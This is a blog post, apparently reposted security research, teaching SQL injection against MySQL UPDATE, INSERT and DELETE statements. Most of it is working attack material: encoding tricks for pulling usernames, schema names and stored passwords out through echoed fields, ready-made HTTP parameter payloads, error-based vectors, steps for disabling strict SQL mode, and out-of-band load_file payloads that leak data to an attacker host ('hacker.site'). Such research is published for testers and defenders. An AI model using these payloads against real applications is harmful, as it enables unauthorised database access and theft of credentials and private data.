---
author: heh3.org
comments: true
date: 2017-02-16 05:07:33+00:00
layout: post
link: http://heh3.org/?p=18
slug: mysql-injection-in-update-insert-and-delete
title: MySQL Injection in Update, Insert and Delete
wordpress_id: 18
categories:
- websec
tags:
- injection
- mysql
- sql
---

## Overview


The traditional in-band method in INSERT, UPDATE injections would be by fixing the query. For example in INSERT statements one can simply fix the query, comment out the rest and extract the data once it is echoed out by the application. Same goes with the UPDATE statement, but only if the query has more than one column we can fix the query. What if we face a situation where UPDATE or INSERT has one column or simply we don’t know the exact query to fix? What if mysql_error() is not echoed out?
Let’s look at the following scenario. For simplicity’s sake let’s not make things complex. The updated username is also echoed back to us. How can we inject in this scenario?

    
    <code>$query = "UPDATE users SET username = '$username' WHERE id = '$id';";
    </code>


The parameters are as follows for the update query.

    
    <code>username=test&id=16 
    </code>


Recently I was researching on different in-band and out-of-band techniques we can apply in these situations.
To understand my technique let’s look at how MySQL handles strings. Basically a string is equal to ‘0’ in MySQL. Let me prove it.

    
    <code>mysql> select 'osanda' = 0;
    +--------------+
    | 'osanda' = 0 |
    +--------------+
    |            1 |
    +--------------+
    
    mysql> select !'osanda';
    +-----------+
    | !'osanda' |
    +-----------+
    |         1 |
    +-----------+
    </code>


What if we add digits to a string? It would be same as adding a value to 0.

    
    <code>mysql> select 'osanda'+123;
    +--------------+
    | 'osanda'+123 |
    +--------------+
    |          123 |
    +--------------+
    </code>


This dynamic ‘feature’ triggered me some new ideas. But wait, let’s research more about the data type. What if we add the highest possible value in MySQL which is a BIGINT to a string?

    
    <code>mysql> select 'osanda'+~0;
    +-----------------------+
    | 'osanda'+~0           |
    +-----------------------+
    | 1.8446744073709552e19 |
    +-----------------------+
    </code>


The value is ‘1.8446744073709552e19’ which means a string actually returns a DOUBLE which is of 8 bytes. Let me prove it.

    
    <code>mysql> select ~0+0e0;
    +-----------------------+
    | ~0+0e0                |
    +-----------------------+
    | 1.8446744073709552e19 |
    +-----------------------+
    
    mysql> select (~0+0e0) = ('osanda' + ~0) ;
    +----------------------------+
    | (~0+0e0) = ('osanda' + ~0) |
    +----------------------------+
    |                          1 |
    </code>


As a conclusion we now know that the value return by the string is actually a DOUBLE. By adding a DOUBLE to a larger value will result in the answer in IEEE double precision. To overcome this problem we can only perform bitwise OR.

    
    <code>mysql> select 'osanda' | ~0;
    +----------------------+
    | 'osanda' | ~0        |
    +----------------------+
    | 18446744073709551615 |
    +----------------------+
    </code>


Perfect, we get the highest unsigned 64-bit BIGINT value which is 0xffffffffffffffff. Now that we can be sure by performing bitwise OR we get the exact value and this value should be less than a BIGINT, simply because we cannot exceed 64-bits.

Converting Strings to Numbers
Basically what if save the data as numbers and decode them back once the application echoes them out? For this I came up with this solution. First we convert the string to hex, next the hex values to decimals.

String -> Hexadecimal -> Decimal

    
    <code>mysql> select conv(hex(version()), 16, 10);
    +--------------------------------+
    | conv(hex(version()), 16, 10)   |
    +--------------------------------+
    | 58472576987956                 |
    +--------------------------------+
    </code>


For decoding we do the opposite. I have mentioned different ways of decoding using SQL, Python and Ruby in the decoding section.

Decimal -> Hexadecimal -> String

    
    <code>mysql> select unhex(conv(58472576987956, 10, 16));
    +-------------------------------------+
    | unhex(conv(58472576987956, 10, 16)) |
    +-------------------------------------+
    | 5.5.34                              |
    +-------------------------------------+
    </code>


But wait, there’s a limitation as I have mentioned earlier. The highest data type in MySQL is a BIGINT and we can’t exceed it. The maximum length of a string can be 8 characters long. Let me show you.

    
    <code>mysql> select conv(hex('AAAAAAAA'), 16, 10);
    +---------------------------------+
    | conv(hex('AAAAAAAA'), 16, 10)   |
    +---------------------------------+
    | 4702111234474983745             |
    +---------------------------------+
    </code>


Note that the value ‘4702111234474983745’ can be decoded back to ‘AAAAAAAA’. If we add another ‘A’ character we won’t get the correct decimal value, it will result in an unsigned BIGINT value of 0xffffffffffffffff.

    
    <code>mysql> select conv(hex('AAAAAAAAA'), 16, 10);
    +--------------------------------+
    | conv(hex('AAAAAAAAA'), 16, 10) |
    +--------------------------------+
    | 18446744073709551615           |
    +--------------------------------+
    
    mysql> select conv(hex('AAAAAAAAA'), 16, 10) = ~0;
    +-------------------------------------+
    | conv(hex('AAAAAAAAA'), 16, 10) = ~0 |
    +-------------------------------------+
    |                                   1 |
    +-------------------------------------+
    </code>


So that we know the limitation, we have to extract a string 8 by 8. For this purpose I will be using the substr() function.

    
    <code>select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);
    </code>


Where \eta \epsilon \mathbb{N}, for easyness I have used ‘n’ where it goes 1,2,3… 8 by 8.
For example to extract the username which is more than 8 characters long, you have to first extract the first 8 characters and then the next remaining characters till we reach NULL.

    
    <code>mysql> select conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)), 16, 10);
    +--------------------------------------------------------+
    | conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)), 16, 10) |
    +--------------------------------------------------------+
    | 8245931987826405219                                    |
    +--------------------------------------------------------+
    
    mysql> select conv(hex(substr(user(),1 + (2-1) * 8, 8 * 2)), 16, 10);
    +--------------------------------------------------------+
    | conv(hex(substr(user(),1 + (2-1) * 8, 8 * 2)), 16, 10) |
    +--------------------------------------------------------+
    | 107118236496756                                        |
    +--------------------------------------------------------+
    </code>


Finally after decoding the values we get the result from user().

    
    <code>mysql> select concat(unhex(conv(8245931987826405219, 10, 16)), unhex(conv(107118236496756, 10, 16)));
    +----------------------------------------------------------------------------------------+
    | concat(unhex(conv(8245931987826405219, 10, 16)), unhex(conv(107118236496756, 10, 16))) |
    +----------------------------------------------------------------------------------------+
    | root@localhost                                                                         |
    +----------------------------------------------------------------------------------------+
    </code>




## Injection




### Extracting Table Names


The syntax for extracting table names from the information_schema database.

    
    <code>select conv(hex(substr((select table_name from information_schema.tables where table_schema=schema() limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
    </code>




### Extracting Column Names


The syntax for extracting column names from the information_schema database.

    
    <code>select conv(hex(substr((select column_name from information_schema.columns where table_name=’Name of your table’ limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
    </code>




### Update Statement


Now we can put the things we learned together. We apply bitwise OR to the string with our payload which converts the data into decimals.
Let’s look at an example where we can apply my technique inside an update statement.

    
    <code>update emails set email_id='osanda'|conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)),16, 10) where id='16';
    </code>


For the previous problem we can inject like this.

    
    <code>name=test' | conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)),16, 10) where id=16;%00&id=16
    </code>


The actual query will look something like this.

    
    <code>update users set username = 'test' | conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)),16, 10) where id=16;%00' where id = '16';
    </code>


This is from a demo application which I developed to test this injection.
![](https://osandamalith.files.wordpress.com/2017/02/webpage.png?w=600)


## Insert Statement


Let’s imagine a query like this.

    
    <code>insert into users values (17,'james', 'bond');
    </code>


Same like the update statement you can apply this method into the insert statement as well.

    
    <code>insert into users values (17,'james', 'bond'|conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)),16, 10);
    </code>


However in this example you can fix the query and inject, but like in the previous case if the insert statement has only one column in the scenario, this method is useful.


## Extracting Data


In MySQL you cannot use the same table name in a sub query in an update or insert statement. To over come this here’s a tricky way I came up with.

    
    <code>update users set username = 'osanda'| conv(hex(substr((select password from (select * from users) as x limit 0,1 ) ,1 + (1-1) * 8, 8 * 1)),16, 10) where id='16';
    </code>




## Limitations in MySQL 5.7


You may notice that my method will not work in versions after MySQL 5.7.5.

    
    <code>mysql> update users set username = 'osanda' | conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)),16, 10) where id=14;
    
    ERROR 1292 (22007): Truncated incorrect INTEGER value: 'osanda'
    </code>


After researching on MySQL 5.7 I noticed that by default the MySQL server runs on ‘Strict SQL Mode’. As of MySQL 5.7.5, the default SQL mode includes ‘STRICT_TRANS_TABLES’.

    
    <code>SELECT @@GLOBAL.sql_mode;
    SELECT @@SESSION.sql_mode;
    </code>


![](https://osandamalith.files.wordpress.com/2017/02/5-7.png?w=600)
In MySQL 5.7 under ‘Strict SQL Mode’you cannot do this tricky type casting from integer to string since the original data type of the column is a ‘varchar’ in my case. “Strict mode controls how MySQL handles invalid or missing values in data-change statements such as INSERT or UPDATE.” If the data type of wrong this will throw us an exception.
To overcome this you must always use an integer in the injection. For example this query will work successfully.

    
    <code>mysql> update users set username = '0' | conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)),16, 10) where id=14;
    
    Query OK, 1 row affected (0.08 sec)
    Rows matched: 1  Changed: 1  Warnings: 0
    </code>


Additionally you can turn off ‘Strict Mode’ during runtime like this. The ‘SESSION’ variable can be modified by any user for his current session.

    
    <code>SET sql_mode = '';
    SET SESSION sql_mode = '';
    </code>


Setting the GLOBAL variable requires the SUPER privilege and affects the operation of all clients that connect from that time on.

    
    <code>SET GLOBAL sql_mode = '';
    </code>


As a permanent solution you need to start MySQL server by specifying empty parameters to ‘sql_mode’.

    
    <code>mysqld.exe --sql-mode=
    </code>


You can also add this entry to your ‘my.cnf’ configuration file.

    
    <code>sql-mode=
    </code>


To find out the order the default options are loaded and paths to the configuration files type this.

    
    <code>mysqld.exe --help --verbose
    </code>


You can create a new file as ‘myfile.ini’ and give this file as the default configuration for MySQL.

    
    <code>mysqld.exe --defaults-file=myfile.ini
    </code>


The content in your configuration.

[mysqld]
sql-mode=
If a developer uses the ‘IGNORE’ keyword, the ‘Strict Mode’ is ignored. We can use like ‘INSERT IGNORE’ or ‘UPDATE IGNORE’.
Under ‘Strict Mode’ if you run this statement, it will execute successfully.

    
    <code>mysql> update ignore users set username = 'osanda' | conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)),16, 10) where id=14;
    
    Query OK, 1 row affected, 1 warning (0.30 sec)
    Rows matched: 1  Changed: 1  Warnings: 1
    </code>


Decoding
Here are some methods you can use in decoding the values in these languages.


### SQL



    
    <code>select unhex(conv(value, 10, 16));
    </code>




### Python



    
    <code>dec = lambda x:("%x"%x).decode('hex')
    </code>




### Ruby



    
    <code>dec = lambda { |x| puts x.to_s(16).scan(/../).map { |x| x.hex.chr }.join }
    </code>


Ruby is an amazing language. Here’s another hacky way of doing this.

    
    <code>dec = lambda { |x| puts x.to_s(16).scan(/\w+/).pack("H*") }
    </code>


This can be done in almost any language. You can come up with any solution with the language you are comfortable with.


## Traditional In-Band Method


Since I wanted to write a complete paper on these injections, these are the normal methods you can inject when there are more than one column in the injection point.


## Update Statement


Let’s imagine the previous problem but this time we have 2 columns in the statement. We also need to know the name of the other column.

    
    <code>UPDATE newsletter SET username = '$user', email = '$email' WHERE id = '$id';
    </code>


We can inject in this form if the application echoes back the value of ‘$email’ to us.

    
    <code>username=test',email = (select version()) where id = '16'-- -&email=test
    </code>


Insert Statement
If we take query for example, we can inject by fixing the query like the previous example. But you need to know the number of values in the query to fix the query.

    
    <code>INSERT INTO `database`.`users` (`id`,`user`,`pass`) VALUES ('$id','$user', '$pass');
    </code>


We can inject like this if the value of ‘$user’ is echoed back to us by the application.

    
    <code>id=16',(SELECT @@version), 'XXX');-- -&user=test&pass=test
    </code>




## Error Based Injection


I wrote a paper on injections in Insert, Update and Delete statements back in the days (I was 17 years to be precise, I feel like I should have written it in a better way :)). You can use any error based vector by following the same syntax like these examples.


## Update Statement



    
    <code>UPDATE users SET password = 'osanda'*multipoint((select*from(select name_const(version(),1))x))*'' WHERE id='16' ;
    
    UPDATE users SET password = 'osanda' WHERE id='16'*polygon((select*from(select name_const(version(),1))x))*'' ;
    </code>




## Insert Statement



    
    <code>INSERT INTO users VALUES (17,'james', 'bond'*polygon((select*from(select name_const(version(),1))x))*'');
    </code>




## Delete Statement



    
    <code>DELETE FROM users WHERE id='17'*polygon((select*from(select name_const(version(),1))x))*'';
    </code>


Instead of ‘*’ you can use ||, or, |, and, &&, &, >>, <<, ^, xor, <=, <, ,>, >=, mul, /, div, -, +, %, mod.


## Out-of-Band (OOB) Injections


You can check my previous research which I have described in detail about MySQL OOB techniques under Windows. The same methods can be applied in ‘INSERT’, ‘UPDATE’ and ‘DELETE’ statements.


## Update Statement



    
    <code>UPDATE users SET username = 'osanda'<=>load_file(concat('\\\\',version(),'.hacker.siste\\a.txt')) WHERE id='15';
    
    UPDATE users SET username = 'osanda' WHERE id='15'*load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
    </code>




## Insert Statement



    
    <code>INSERT into users VALUES (15,'james','bond'|load_file(concat('\\\\',version(),'.hacker.site\\a.txt')));
    </code>




## Delete Statement



    
    <code>DELETE FROM users WHERE id='15'*load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
    </code>


You can use ||, or, |, and, &&, &, >>, <<, ^, xor, <=, <, ,>, >=, *,mul, /, div, -, +, %, mod.


## Conclusion


Exploitation of a vulnerability is not straight forward in real world scenarios. It’s up to you to make use of these techniques and come with a creative solution in the exploitation of SQL injection vulnerabilities. Analyze the situation and depending on the situation apply the correct techniques.


## Acknowledgements


Special thanks to Mukarram Khalid (@themakmaniac) for reviewing and testing my research.


## Paper


[https://www.exploit-db.com/docs/41275.pdf ](https://www.exploit-db.com/docs/41275.pdf)
[https://packetstormsecurity.com/files/140936/Extracting-Data-From-UPDATE-And-INSERT.html ](https://packetstormsecurity.com/files/140936/Extracting-Data-From-UPDATE-And-INSERT.html)


## References


[http://dev.mysql.com/doc/refman/5.7/en/](http://dev.mysql.com/doc/refman/5.7/en/)

SQLi is often a cancerous topic, if you plan to copy or share please give credits to the author.

[https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/#more-2172](https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/#more-2172)
